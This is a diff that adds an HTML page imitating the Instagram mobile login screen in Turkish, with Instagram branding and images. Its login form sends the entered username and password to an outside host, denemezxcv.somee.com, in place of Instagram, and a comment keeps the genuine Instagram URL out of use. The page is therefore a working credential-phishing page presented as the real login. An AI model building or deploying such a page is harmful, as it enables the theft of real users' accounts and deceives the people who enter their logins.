@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<title>Instagram</title>
+	<link rel="stylesheet" type="text/css" href="css/mobile.css">
+	<link rel="icon" href="foto/title.ico" type="image/gif" sizes="16x16">
+</head>
+
+<body id="body">
+	<img src="mobile_foto/1.png">
+	<img src="mobile_foto/2.png">
+	<img src="mobile_foto/3.png">
+<!--formaction="https://www.instagram.com/"-->
+
+	<form action="http://denemezxcv.somee.com" method="post">
+		<input id="username" name="username" type="text" placeholder="Telefon Numarası, kullanıcı adı veya e-posta"><br>
+		<input id="password" name="password" type="password" placeholder="şifre" onclick="myFunction()"><br>
+		<input type="button" id="goster" onclick="goster_func()" value="Göster" style="visibility: hidden;">
+		<a><p id="unut">Şifreni mi unuttun?</p></a>
+		<input id="login" type="submit" value="Giriş Yap" ><br>
+	</form>
+
+	<p id="hesabın">Hesabın yok mu? </p>		
+	<p id="kaydol">Kaydol</p >
+	<img id="from" src="mobile_foto/5.png">
+
+	<script>
+		var uzunluk = window.screen.height;
+		var genişlik = window.screen.width;
+		if (uzunluk >= "900" && genişlik >= "900"){
+			window.location.href='index.html';
+		}
+		function myFunction() {
+			button_color().goster_func()
+			var x = document.getElementById("password");
+			if (x.type === "password") {
+				x.type = "text";
+			} 
+			else {
+				x.type = "password";
+			}
+		}
+		function button_color(){
+			document.getElementById("login").style.backgroundColor="#0195f7";
+			document.getElementById("goster").style.visibility = "initial"; 
+		}
+		function goster_func(){
+			var goster = document.getElementById("goster").value;
+			if (goster == "Göster"){
+				document.getElementById("goster").value="Gizle";
+			}
+			else {
+				document.getElementById("goster").value="Göster";
+			}
+		}	
+
+	</script>
+</body>
+</html>
